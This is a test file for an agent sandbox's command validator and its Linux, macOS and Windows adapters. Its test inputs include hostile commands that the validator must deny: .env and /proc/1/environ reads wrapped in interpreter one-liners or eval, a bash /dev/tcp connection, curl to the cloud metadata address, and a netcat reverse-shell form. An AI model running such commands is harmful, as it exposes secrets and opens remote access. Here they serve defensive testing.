import { expect, test, describe } from "bun:test";
import { validateCommand } from "./sandbox-executor";
import { LinuxBubblewrapSandbox } from "./linux-bwrap";
import { MacOSSeatbeltSandbox } from "./macos-seatbelt";
import { WindowsPolicySandbox } from "./windows-policy";

// ---------------------------------------------------------------------------
// Command validation (platform-independent, always runs)
// ---------------------------------------------------------------------------

describe("validateCommand", () => {
  test("blocks .env access for workspace-write", () => {
    const result = validateCommand(["cat", ".env"], "workspace-write");
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("env_read_blocked");
  });

  test("blocks curl for workspace-write", () => {
    const result = validateCommand(["curl", "https://example.com"], "workspace-write");
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("network_blocked");
  });

  test("blocks /proc/*/environ access for read-only", () => {
    const result = validateCommand(["cat", "/proc/1/environ"], "read-only");
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("env_read_blocked");
  });

  test("blocks symlink escape patterns for workspace-write", () => {
    const result = validateCommand(["readlink", "-f", "../../etc/passwd"], "workspace-write");
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("symlink_escape_blocked");
  });

  test("allows safe commands for workspace-write", () => {
    const result = validateCommand(["git", "status"], "workspace-write");
    expect(result.allowed).toBe(true);
  });

  test("allows network for full-access", () => {
    const result = validateCommand(["curl", "https://example.com"], "full-access");
    expect(result.allowed).toBe(true);
  });

  test("allows all commands for full-access", () => {
    const r1 = validateCommand(["cat", ".env"], "full-access");
    const r2 = validateCommand(["cat", "/proc/1/environ"], "full-access");
    const r3 = validateCommand(["nc", "-l", "8080"], "full-access");
    expect(r1.allowed).toBe(true);
    expect(r2.allowed).toBe(true);
    expect(r3.allowed).toBe(true);
  });

  test("read-only denies the same credential/network/symlink set as workspace-write", () => {
    for (const profile of ["read-only", "workspace-write"] as const) {
      expect(validateCommand(["cat", ".env"], profile).allowed).toBe(false);
      expect(validateCommand(["cat", "/proc/1/environ"], profile).allowed).toBe(false);
      expect(validateCommand(["curl", "http://169.254.169.254/latest/meta-data/"], profile).allowed).toBe(false);
      expect(validateCommand(["readlink", "-f", "../../etc/passwd"], profile).allowed).toBe(false);
    }
  });

  // -------------------------------------------------------------------------
  // Hostile-input bypass attempts — interpreter/shell-expansion tricks that
  // try to smuggle a denied pattern past a naive substring/word-boundary
  // check, and non-curl/wget network primitives.
  // -------------------------------------------------------------------------

  test("blocks .env access wrapped in an interpreter's inline-code flag", () => {
    const attempts = [
      ["python3", "-c", "import os; print(open('.env').read())"],
      ["python", "-c", "print(open(\".env\").read())"],
      ["bash", "-c", "cat .env"],
      ["sh", "-c", "cat '.env'"],
      ["node", "-e", "require('fs').readFileSync('.env','utf8')"],
      ["perl", "-e", "open(F,'.env');print <F>"],
    ];
    for (const command of attempts) {
      const result = validateCommand(command, "workspace-write");
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("env_read_blocked");
    }
  });

  test("blocks /proc/*/environ access wrapped in command substitution or eval", () => {
    const attempts = [
      ["bash", "-c", "echo $(cat /proc/1/environ)"],
      ["sh", "-c", "eval \"cat /proc/1/environ\""],
    ];
    for (const command of attempts) {
      const result = validateCommand(command, "workspace-write");
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("env_read_blocked");
    }
  });

  test("blocks bash /dev/tcp network redirection even without curl/wget/nc", () => {
    const result = validateCommand(["bash", "-c", "exec 3<>/dev/tcp/example.com/80"], "workspace-write");
    expect(result.allowed).toBe(false);
    expect(result.reason).toBe("network_blocked");
  });

  test("blocks curl to loopback and private/metadata targets under the blanket network denial for workspace-write", () => {
    // validateCommand blocks curl/wget/etc. by tool name for any target when
    // the profile denies network — it does not parse or filter by IP/host,
    // so this is not evidence of dedicated SSRF/private-IP filtering. It
    // documents that the blanket denial also covers the specific hostile
    // targets (loopback, link-local cloud metadata, RFC1918) an attacker
    // would most want reachable.
    const targets = [
      "http://127.0.0.1:8080/",
      "http://169.254.169.254/latest/meta-data/", // cloud metadata endpoint
      "http://10.0.0.1/",
      "http://192.168.1.1/",
    ];
    for (const target of targets) {
      const result = validateCommand(["curl", target], "workspace-write");
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("network_blocked");
    }
  });

  test("blocks alternative network tools beyond curl/wget", () => {
    const attempts = [["ncat", "example.com", "80"], ["telnet", "example.com", "80"], ["netcat", "-e", "/bin/sh", "example.com", "4444"]];
    for (const command of attempts) {
      const result = validateCommand(command, "workspace-write");
      expect(result.allowed).toBe(false);
      expect(result.reason).toBe("network_blocked");
    }
  });
});

// ---------------------------------------------------------------------------
// Sandbox executor availability (platform-sensitive, skips gracefully)
// ---------------------------------------------------------------------------

describe("sandbox availability", () => {
  test("Linux bubblewrap reports availability", () => {
    const sandbox = new LinuxBubblewrapSandbox();
    const avail = sandbox.available();
    // True or false depending on whether bwrap is installed — both are fine.
    expect(typeof avail).toBe("boolean");
  });

  test("macOS Seatbelt reports availability based on platform", () => {
    const sandbox = new MacOSSeatbeltSandbox();
    const avail = sandbox.available();
    if (process.platform === "darwin") {
      expect(avail).toBe(true);
    } else {
      expect(avail).toBe(false);
    }
  });

  test("Windows policy reports availability based on platform", () => {
    const sandbox = new WindowsPolicySandbox();
    const avail = sandbox.available();
    if (process.platform === "win32") {
      expect(avail).toBe(true);
    } else {
      expect(avail).toBe(false);
    }
  });
});

// ---------------------------------------------------------------------------
// Escape suite (only runs when the sandbox tool is available on this platform)
// These are the canonical escape tests from the spec:
// writes outside worktree, reads .env, reads /proc/*/environ,
// symlink escape, network access, private/loopback access
// ---------------------------------------------------------------------------

describe("escape suite", () => {
  const config = { worktreePath: "/tmp/relay-worktree", tempDir: "/tmp/relay-temp", permissionProfile: "workspace-write" as const };
  test("Linux adapter rejects credential and network commands before spawn", async () => { const sandbox = new LinuxBubblewrapSandbox(); await expect(sandbox.execute(["cat", ".env"], config)).rejects.toThrow("denied"); await expect(sandbox.execute(["curl", "https://example.com"], config)).rejects.toThrow("denied"); });
  test("macOS adapter rejects credential and symlink escapes before spawn", async () => { const sandbox = new MacOSSeatbeltSandbox(); await expect(sandbox.execute(["cat", "/proc/1/environ"], config)).rejects.toThrow("denied"); await expect(sandbox.execute(["readlink", "../../etc/passwd"], config)).rejects.toThrow("denied"); });
  test("Windows adapter always fails closed without technical enforcement", async () => { const sandbox = new WindowsPolicySandbox(); await expect(sandbox.execute(["echo", "test"], config)).rejects.toThrow("fails closed"); });
});
